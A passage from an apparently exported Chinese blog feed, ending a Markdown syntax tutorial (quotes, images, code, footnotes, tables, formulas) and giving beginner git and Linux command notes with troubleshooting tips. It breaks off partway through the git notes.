title="引用的多层嵌套"></a>引用的多层嵌套</h2><p>区块引用可以嵌套（例如：引用内的引用），只要根据层次加上不同数量的 &gt; ：</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">&gt;&gt;&gt; 请问 Markdwon 怎么用？ - 小白</span><br><span class="line">&gt;&gt; 自己看教程！ - 愤青</span><br><span class="line">&gt; 教程在哪？ - 小白</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>显示效果：</p><blockquote><blockquote><p>请问 Markdwon 怎么用？ - 小白</p></blockquote><p>自己看教程！ - 愤青</p></blockquote><p>教程在哪？ - 小白</p><h2 id="引用其它要素"><a href="#引用其它要素" class="headerlink" title="引用其它要素"></a>引用其它要素</h2><p>引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等：</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">&gt; 1.   这是第一行列表项。</span><br><span class="line">&gt; 2.   这是第二行列表项。</span><br><span class="line">&gt; </span><br><span class="line">&gt; 给出一些例子代码：</span><br><span class="line">&gt; </span><br><span class="line">&gt;     return shell_exec(&quot;echo $input | $markdown_script&quot;);</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>显示效果：</p><ol><li>这是第一行列表项。</li><li>这是第二行列表项。</li></ol><p>给出一些例子代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return shell_exec(&quot;echo $input | $markdown_script&quot;);</span><br></pre></td></tr></table></figure><h1 id="插入图像"><a href="#插入图像" class="headerlink" title="插入图像"></a>插入图像</h1><p>图片的创建方式与超链接相似，而且和超链接一样也有两种写法，行内式和参考式写法。</p><p>语法中图片Alt的意思是如果图片因为某些原因不能显示，就用定义的图片Alt文字来代替图片。 图片Title则和链接中的Title一样，表示鼠标悬停与图片上时出现的文字。 Alt 和 Title 都不是必须的，可以省略，但建议写上。</p><h2 id="行内式-1"><a href="#行内式-1" class="headerlink" title="行内式"></a>行内式</h2><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">美丽花儿：</span><br><span class="line">![美丽花儿](http:&#x2F;&#x2F;ww2.sinaimg.cn&#x2F;large&#x2F;56d258bdjw1eugeubg8ujj21kw16odn6.jpg &quot;美丽花儿&quot;)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h2 id="参考式-1"><a href="#参考式-1" class="headerlink" title="参考式"></a>参考式</h2><p>语法说明：</p><p>在文档要插入图片的地方写![图片Alt][标记]</p><p>在文档的最后写上[标记]:图片地址 “Title”</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">美丽花儿：</span><br><span class="line">![美丽花儿][flower]</span><br><span class="line">[flower]:http:&#x2F;&#x2F;ww2.sinaimg.cn&#x2F;large&#x2F;56d258bdjw1eugeubg8ujj21kw16odn6.jpg  &quot;美丽花儿&quot;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h1 id="内容目录"><a href="#内容目录" class="headerlink" title="内容目录"></a>内容目录</h1><h2 id="行内式-2"><a href="#行内式-2" class="headerlink" title="行内式"></a>行内式</h2><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C语言里的函数 &#96;scanf()&#96; 怎么使用？</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><p>C语言里的函数 <code>scanf()</code> 怎么使用？</p><h2 id="缩进式多行代码"><a href="#缩进式多行代码" class="headerlink" title="缩进式多行代码"></a>缩进式多行代码</h2><p>缩进 4 个空格或是 1 个制表符</p><p>一个代码区块会一直持续到没有缩进的那一行（或是文件结尾）。</p><p>代码：</p><pre><code>        #include &lt;stdio.h&gt;        int main(void)        &#123;            printf(&quot;Hello world\n&quot;);        &#125;</code></pre><p>显示效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Hello world\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>8.3. 用六个`包裹多行代码<br>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Hello world\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">、、、</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Hello world\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="HTML-原始码"><a href="#HTML-原始码" class="headerlink" title="HTML 原始码"></a>HTML 原始码</h2><p>在代码区块里面， &amp; 、 &lt; 和 &gt; 会自动转成 HTML 实体，这样的方式让你非常容易使用 Markdown 插入范例用的 HTML 原始码，只需要复制贴上，剩下的 Markdown 都会帮你处理，例如：</p><p>代码：</p><p>第一个例子：</p><pre><code>    &lt;div class=&quot;footer&quot;&gt;       © 2004 Foo Corporation    &lt;/div&gt;</code></pre><p>第二个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">   © 2004 Foo Corporation</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">第二个例子：</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th rowspan&#x3D;&quot;2&quot;&gt;值班人员&lt;&#x2F;th&gt;</span><br><span class="line">        &lt;th&gt;星期一&lt;&#x2F;th&gt;</span><br><span class="line">        &lt;th&gt;星期二&lt;&#x2F;th&gt;</span><br><span class="line">        &lt;th&gt;星期三&lt;&#x2F;th&gt;</span><br><span class="line">    &lt;&#x2F;tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;李强&lt;&#x2F;td&gt;</span><br><span class="line">        &lt;td&gt;张明&lt;&#x2F;td&gt;</span><br><span class="line">        &lt;td&gt;王平&lt;&#x2F;td&gt;</span><br><span class="line">    &lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><p>第一个例子：</p><p>© 2004 Foo Corporation<br>第二个例子：</p><table>    <tr>        <th rowspan="2">值班人员</th>        <th>星期一</th>        <th>星期二</th>        <th>星期三</th>    </tr>    <tr>        <td>李强</td>        <td>张明</td>        <td>王平</td>    </tr></table><p>​        1.Markdown是一种纯文本标记语言 ↩<br>​        2.HyperText Markup Language 超文本标记语言 ↩<br>​        3.开源笔记平台，支持Markdown和笔记直接发为博文 ↩</p><h1 id="注脚"><a href="#注脚" class="headerlink" title="注脚"></a>注脚</h1><p>语法说明：</p><p>在需要添加注脚的文字后加上脚注名字<sup><a href="#fn_注脚名字" id="reffn_注脚名字">注脚名字</a></sup>,称为加注。 然后在文本的任意位置(一般在最后)添加脚注，脚注前必须有对应的脚注名字。</p><p>注意：经测试注脚与注脚之间必须空一行，不然会失效。成功后会发现，即使你没有把注脚写在文末，经Markdown转换后，也会自动归类到文章的最后。<br>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用 Markdown[^1]可以效率的书写文档, 直接转换成 HTML[^2], 你可以使用 Leanote[^Le] 编辑器进行书写。</span><br><span class="line">[^1]:Markdown是一种纯文本标记语言</span><br><span class="line">[^2]:HyperText Markup Language 超文本标记语言</span><br><span class="line">[^Le]:开源笔记平台，支持Markdown和笔记直接发为博文</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><p>使用 Markdown<a href="http://blog.leanote.com/post/freewalk/Markdown-语法手册#fn:1">1</a>可以效率的书写文档, 直接转换成 HTML<a href="http://blog.leanote.com/post/freewalk/Markdown-语法手册#fn:2">2</a>, 你可以使用 Leanote<a href="http://blog.leanote.com/post/freewalk/Markdown-语法手册#fn:le">3</a> 编辑器进行书写。</p><p>注：脚注自动被搬运到最后面，请到文章末尾查看，并且脚注后方的链接可以直接跳转回到加注的地方。</p><h1 id="LaTeX-公式"><a href="#LaTeX-公式" class="headerlink" title="LaTeX 公式"></a>LaTeX 公式</h1><h2 id="表示行内公式："><a href="#表示行内公式：" class="headerlink" title="$ 表示行内公式："></a>$ 表示行内公式：</h2><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">质能守恒方程可以用一个很简洁的方程式 $E&#x3D;mc^2$ 来表达。</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>显示效果：</p><p>质能守恒方程可以用一个很简洁的方程式 来表达。</p><h2 id="表示整行公式："><a href="#表示整行公式：" class="headerlink" title="$$ 表示整行公式："></a>$$ 表示整行公式：</h2><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$$\sum_&#123;i&#x3D;1&#125;^n a_i&#x3D;0$$</span><br><span class="line">$$f(x_1,x_x,\ldots,x_n) &#x3D; x_1^2 + x_2^2 + \cdots + x_n^2 $$</span><br><span class="line">$$\sum^&#123;j-1&#125;_&#123;k&#x3D;0&#125;&#123;\widehat&#123;\gamma&#125;_&#123;kj&#125; z_k&#125;$$</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：</p><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flow</span><br><span class="line">st&#x3D;&gt;start: Start:&gt;https:&#x2F;&#x2F;www.zybuluo.com</span><br><span class="line">io&#x3D;&gt;inputoutput: verification</span><br><span class="line">op&#x3D;&gt;operation: Your Operation</span><br><span class="line">cond&#x3D;&gt;condition: Yes or No?</span><br><span class="line">sub&#x3D;&gt;subroutine: Your Subroutine</span><br><span class="line">e&#x3D;&gt;end</span><br><span class="line">st-&gt;io-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;sub-&gt;io</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果：<br>                                                      StartverificationYour OperationYes or No?EndYour Subroutineyesno</p><h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><p>语法说明：</p><ol><li>不管是哪种方式，第一行为表头，第二行分隔表头和主体部分，第三行开始每一行为一个表格行。</li><li>列于列之间用管道符|隔开。原生方式的表格每一行的两边也要有管道符。</li><li>第二行还可以为不同的列指定对齐方向。默认为左对齐，在-右边加上:就右对齐。</li></ol><p>代码：</p><p>简单方式写表格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">学号|姓名|分数</span><br><span class="line">-|-|-</span><br><span class="line">小明|男|75</span><br><span class="line">小红|女|79</span><br><span class="line">小陆|男|92</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原生方式写表格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">|学号|姓名|分数|</span><br><span class="line">|-|-|-|</span><br><span class="line">|小明|男|75|</span><br><span class="line">|小红|女|79|</span><br><span class="line">|小陆|男|92|</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为表格第二列指定方向：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">产品|价格</span><br><span class="line">-|-:</span><br><span class="line">Leanote 高级账号|60元&#x2F;年</span><br><span class="line">Leanote 超级账号|120元&#x2F;年</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示效果： </p><p>简单方式写表格：</p><div class="table-container"><table><thead><tr><th style="text-align:center">学号</th><th>姓名</th><th>分数</th></tr></thead><tbody><tr><td style="text-align:center">小明</td><td>男</td><td>75</td></tr><tr><td style="text-align:center">小红</td><td>女</td><td>79</td></tr><tr><td style="text-align:center">小陆</td><td>男</td><td>92</td></tr><tr><td style="text-align:center">原生方式写表格：</td><td></td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:center">学号</th><th>姓名</th><th>分数</th></tr></thead><tbody><tr><td style="text-align:center">小明</td><td>男</td><td>75</td></tr><tr><td style="text-align:center">小红</td><td>女</td><td>79</td></tr><tr><td style="text-align:center">小陆</td><td>男</td><td>92</td></tr><tr><td style="text-align:center">为表格第二列指定方向：</td><td></td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:center">产品</th><th style="text-align:center">价格</th></tr></thead><tbody><tr><td style="text-align:center">Leanote 高级账号</td><td style="text-align:center">60元/年</td></tr><tr><td style="text-align:center">Leanote 超级账号</td><td style="text-align:center">120元/年</td></tr></tbody></table></div><h1 id="分隔线"><a href="#分隔线" class="headerlink" title="分隔线"></a>分隔线</h1><p>你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">* * *</span><br><span class="line"> </span><br><span class="line">***</span><br><span class="line"> </span><br><span class="line">*****- - -</span><br><span class="line"> </span><br><span class="line">---------------------------------------</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>显示效果都一样：</p><hr><hr><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>对于程序员来说这个功能是必不可少的，插入程序代码的方式有两种，一种是利用缩进(Tab), 另一种是利用”`”符号（一般在ESC键下方）包裹代码。</p><p>语法说明：</p><p>​        1.插入行内代码，即插入一个单词或者一句代码的情况，使用<code>code</code>这样的形式插入。<br>​        2.插入多行代码，可以使用缩进或者“<code>code “</code>,具体看示例。<br>注意： 缩进式插入前方必须有空行</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>你想知道git命令吗？进来看看！</title>
      <link href="blog/git/"/>
      <url>blog/git/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>git</strong>命令</p><h2 id="git创建仓库和remote"><a href="#git创建仓库和remote" class="headerlink" title="git创建仓库和remote"></a>git创建仓库和remote</h2><p>第一步：再github.com页面找到+号</p><p><img src="image-20220413155744946.png" alt=""></p><p>第二步：</p><p><img src="image-20220413160224428.png" alt=""></p><p>第三步：复制仓库的地址</p><p><img src="image-20220413160345376.png" alt=""></p><p>第四步：remote</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add 名字 仓库地址</span><br></pre></td></tr></table></figure><p><img src="image-20220413162904143.png" alt=""></p><h2 id="将资料推送到远程库中"><a href="#将资料推送到远程库中" class="headerlink" title="将资料推送到远程库中"></a>将资料推送到远程库中</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#查看状态</span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line">#暂存区</span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line">#提交到本地仓库</span><br><span class="line">git commit -m &quot;说明&quot;</span><br><span class="line"></span><br><span class="line">#查看分支</span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line">#切换分支</span><br><span class="line">git chekout 分支名</span><br><span class="line"></span><br><span class="line">#合并分支</span><br><span class="line">git merge 分支名，#这里的分支名是要合并在被选中分支名上</span><br><span class="line"></span><br><span class="line">#查看当前所有远程地址别名</span><br><span class="line">git remote -v</span><br><span class="line"></span><br><span class="line">#提交到远程库</span><br><span class="line">git push -u remote名称 分支名</span><br></pre></td></tr></table></figure><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h4 id="git-status"><a href="#git-status" class="headerlink" title="git status"></a>git status</h4><p><img src="image-20220413164255069.png" alt=""></p><p>解决办法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init # 初始化仓库</span><br></pre></td></tr></table></figure><p><img src="image-20220413164340675.png" alt=""></p><h4 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h4><p><img src="image-20220413164505291-16525172162311.png" alt=""></p><p>解决办法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &quot;邮箱&quot;</span><br><span class="line">git config --global user.name &quot;账号&quot;</span><br></pre></td></tr></table></figure><h4 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h4><p><img src="image-20220413164704475.png" alt=""></p><p>解决办法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote add remote名字 远程仓库地址</span><br><span class="line">git push -u remote名字 分支名</span><br></pre></td></tr></table></figure><p><img src="image-20220413164843768.png" alt=""></p><hr><p><img src="image-20220413164905526.png" alt=""></p><p>解决办法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">重新设置远程地址名</span><br><span class="line">git remote add remote名字 远程仓库地址</span><br></pre></td></tr></table></figure><p><img src="image-20220413165017019.png" alt=""></p><p><img src="image-20220413165055812.png" alt=""></p><hr><p><img src="clipboard.png" alt=""></p><p><img src="clipboard-16498408357132.png" alt=""></p><p>解决办法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密码用token值登录就行了</span><br><span class="line">token值：用自己的token值</span><br></pre></td></tr></table></figure><hr><p><img src="image-20220413173915006-16525173247632.png" alt=""></p><p>问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同一个仓库：现在推送的资料路径跟上一次推送的路径</span><br></pre></td></tr></table></figure><p>解决办法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一进去git界面就先执行git pull命令，而且要上传的资料需与上一次上传到远程库中的资料的路径要一致</span><br><span class="line"># 将不同的资料推送到同一个仓库中时，需要先拉取下来</span><br><span class="line">git pull 远程地址名 分支名</span><br><span class="line"># 再进行推送</span><br><span class="line">git push 远程地址名 分支名</span><br></pre></td></tr></table></figure><p><img src="image-20220413173955367.png" alt=""></p><h2 id="git-remote-命令"><a href="#git-remote-命令" class="headerlink" title="git remote 命令"></a>git remote 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git remote add [shortname] [url] # 创建远程地址名</span><br><span class="line">git remote rm name  # 删除远程仓库地址名</span><br><span class="line">git remote rename old_name new_name  # 修改远程地址名</span><br></pre></td></tr></table></figure><h2 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git:&#x2F;&#x2F;github.com&#x2F;schacon&#x2F;grit.git mygrit</span><br></pre></td></tr></table></figure><h2 id="git-push-1"><a href="#git-push-1" class="headerlink" title="git push"></a>git push</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt; # 推送到远程仓库中</span><br><span class="line">git push --force origin master # 强行推送</span><br></pre></td></tr></table></figure><h2 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一进去git界面就先执行git pull命令，而且要上传的资料需与上一次上传到远程库中的资料的路径要一致</span><br><span class="line"># 将不同的资料推送到同一个仓库中时，需要先拉取下来</span><br><span class="line">git pull 远程地址名 分支名</span><br><span class="line"># 再进行推送</span><br><span class="line">git push 远程地址名 分支名</span><br></pre></td></tr></table></figure><h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><p>创建分支命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch (branchname)</span><br></pre></td></tr></table></figure><p>切换分支命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout (branchname)</span><br></pre></td></tr></table></figure><p>合并分支：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge 分支名，#这里的分支名是要合并在被选中分支名上</span><br></pre></td></tr></table></figure><h2 id="快速查找命令符"><a href="#快速查找命令符" class="headerlink" title="快速查找命令符"></a>快速查找命令符</h2><p><img src="1009686-20160824100127870-1820786836.png" alt=""></p><p><strong>——-整理的git笔记———</strong></p><h2 id="基础linux-命令"><a href="#基础linux-命令" class="headerlink" title="基础linux 命令"></a>基础linux 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">clear ：清除屏幕</span><br><span class="line"></span><br><span class="line">echo &#39;test content&#39;**：往控制台输出信息 **echo &#39;test content&#39; &gt; test.txt ll ：将当前目录下的 子文件&amp;子目录平铺在控制台</span><br><span class="line"></span><br><span class="line">find 目录名： 将对应目录下的子孙文件&amp;子孙目录平铺在控制台</span><br><span class="line"></span><br><span class="line">find 目录名 -type f ：将对应目录下的文件平铺在控制台</span><br><span class="line"></span><br><span class="line">rm   文件名 ： 删除文件</span><br><span class="line"></span><br><span class="line">mv 源文件 重命名文件: 重命名</span><br><span class="line"></span><br><span class="line">cat 文件的url : 查看对应文件的内容</span><br><span class="line"></span><br><span class="line">#### vim 文件的 url(在英文模式下)</span><br><span class="line"></span><br><span class="line">按 i 进插入模式 进行文件的编辑按 esc 键&amp;按:键 进行命令的执行</span><br><span class="line"></span><br><span class="line">q!   强制退出（不保存）</span><br><span class="line"></span><br><span class="line">wq  保存退出</span><br><span class="line"></span><br><span class="line">set nu 设置行号</span><br></pre></td></tr></table></figure><pre><code>git对象    git hash-object -w fileUrl : 生成一个key(hash值):val(压缩后的文件内容)键值对存到.git/objectstree对象    git update-index --add --cacheinfo 100644 hash test.txt : 往暂存区添加一条记录(让git对象 对应 上文件名)存到.git/index    git write-tree : 生成树对象存到.git/objectscommit对象    echo &#39;first commit&#39; | git commit-tree treehash : 生成一个提交对象存到.git/objects对以上对象的查询    git cat-file -p hash       : 拿对应对象的内容    git cat-file -t hash       : 拿对应对象的类型</code></pre><h2 id="查看暂存区"><a href="#查看暂存区" class="headerlink" title="查看暂存区"></a>查看暂存区</h2><pre><code>git ls-files -s        </code></pre><p>​        安装</p><pre><code>git --version</code></pre><h2 id="重点①初始化仓库"><a href="#重点①初始化仓库" class="headerlink" title="重点①初始化仓库"></a>重点①初始化仓库</h2><pre><code>git init 初始化在所在的文件，作为仓库！</code></pre><h2 id="重点②初始化配置"><a href="#重点②初始化配置" class="headerlink" title="重点②初始化配置"></a>重点②初始化配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git config user.name tom_pro（仓库级别）</span><br><span class="line">git config user.email goodMorning_pro@atguigu.com</span><br><span class="line"></span><br><span class="line">②设置签名</span><br><span class="line">git config --global user.name 名字</span><br><span class="line">git config --global user.email 邮箱  </span><br><span class="line">git config --list</span><br><span class="line">③查看签名配置</span><br><span class="line">cat ~&#x2F;.gitconfig</span><br></pre></td></tr></table></figure><h2 id="重点④远程协作的基本流程"><a href="#重点④远程协作的基本流程" class="headerlink" title="重点④远程协作的基本流程"></a>重点④远程协作的基本流程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">第一步: 项目经理创建一个空的远程仓库 </span><br><span class="line">第二步:</span><br><span class="line">第三步: 为远程仓库配别名  配完用户名 邮箱</span><br><span class="line">第四步: 在本地仓库中初始化代码 提交代码</span><br><span class="line">第五步: 推送</span><br><span class="line">第六步: 邀请成员</span><br><span class="line">第七步: 成员克隆远程仓库</span><br><span class="line">第八步: 成员做出修改</span><br><span class="line">第九步: 成员推送自己的修改</span><br><span class="line">第十步: 项目经理拉取成员的修改</span><br></pre></td></tr></table></figure><h2 id="重点⑤创建远程库地址别名"><a href="#重点⑤创建远程库地址别名" class="headerlink" title="重点⑤创建远程库地址别名"></a>重点⑤创建远程库地址别名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 